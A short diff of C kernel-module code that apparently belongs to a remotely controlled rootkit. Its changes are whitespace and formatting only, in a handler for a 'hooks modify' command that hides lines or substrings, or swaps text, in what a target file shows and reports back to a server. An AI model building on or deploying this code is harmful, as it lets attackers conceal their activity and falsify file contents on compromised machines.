@@ -198,7 +198,7 @@ static int modify_file_handler(char *args, enum Protocol protocol) {
             if (*num != '\0')
                 hide_line = simple_strtol(num, NULL, 10);
         }
-        
+
         else if (strncmp(token, "hide_substr=", 12) == 0) {
             char *txt = token + 12;
             if (*txt == '\0') {
@@ -239,7 +239,7 @@ static int modify_file_handler(char *args, enum Protocol protocol) {
             }
         }
         else {
-            send_to_server(protocol,"Usage: hooks modify /full/path [hide_line=N] [hide_substr=TXT] [replace=SRC:DST]\n");
+            send_to_server(protocol, "Usage: hooks modify /full/path [hide_line=N] [hide_substr=TXT] [replace=SRC:DST]\n");
             ret = -EINVAL;
             goto cleanup;
         }
@@ -247,7 +247,7 @@ static int modify_file_handler(char *args, enum Protocol protocol) {
 
     // DEBUG
     DBG_MSG("modify_file_handler: path='%s', hide_line=%ld, hide_substr='%s', replace_src='%s', replace_dst='%s'\n",
-        path, hide_line, hide_substr ? hide_substr : "NULL", replace_src ? replace_src : "NULL", replace_dst ? replace_dst : "NULL");
+            path, hide_line, hide_substr ? hide_substr : "NULL", replace_src ? replace_src : "NULL", replace_dst ? replace_dst : "NULL");
 
     ret = alterate_add(path, hide_line, hide_substr, replace_src, replace_dst);
     if (ret >= 0)
